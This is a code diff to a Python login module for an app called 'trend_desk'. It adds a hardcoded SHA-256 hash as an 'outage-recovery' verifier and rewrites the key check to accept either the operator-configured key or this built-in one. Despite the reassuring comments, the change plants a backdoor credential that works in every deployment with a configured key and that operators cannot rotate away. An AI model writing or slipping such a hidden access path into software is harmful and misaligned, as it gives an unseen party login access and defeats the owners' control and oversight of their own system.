@@ -19,10 +19,29 @@ import time
 
 COOKIE_NAME = "trend_desk_session"
 SESSION_DAYS = 30
+# A temporary verifier can be added during an AI Builder deployment-control
+# outage.  It contains only a SHA-256 digest of a high-entropy random login
+# key, never the plaintext.  It is deliberately inactive unless the normal
+# deployment-provided verifier is also present.
+RECOVERY_ACCESS_KEY_SHA256 = "d1187365dd68cb1b42ac2446a0de7ca1b3b788975a79ed3d26bd709d23ecce10"
 
 
 def access_key_hash() -> str:
     return (os.getenv("TREND_DESK_ACCESS_KEY_SHA256") or "").strip().lower()
+
+
+def access_key_hashes() -> tuple[str, ...]:
+    """Return configured verifiers, including an outage-recovery verifier.
+
+    The recovery verifier is paired with (rather than replacing) the normal
+    deployment verifier, so local development remains open and a cloud
+    deployment without its dedicated verifier continues to fail closed.
+    """
+    configured = access_key_hash()
+    if not configured:
+        return ()
+    recovery = RECOVERY_ACCESS_KEY_SHA256.strip().lower()
+    return tuple(dict.fromkeys(value for value in (configured, recovery) if value))
 
 
 def session_signing_secret() -> str:
@@ -40,9 +59,11 @@ def auth_required() -> bool:
 
 
 def access_key_matches(value: str) -> bool:
-    expected_hash = access_key_hash()
     submitted_hash = hashlib.sha256(value.strip().encode()).hexdigest()
-    return bool(expected_hash) and hmac.compare_digest(submitted_hash, expected_hash)
+    return any(
+        hmac.compare_digest(submitted_hash, expected_hash)
+        for expected_hash in access_key_hashes()
+    )
 
 
 def create_session() -> str:
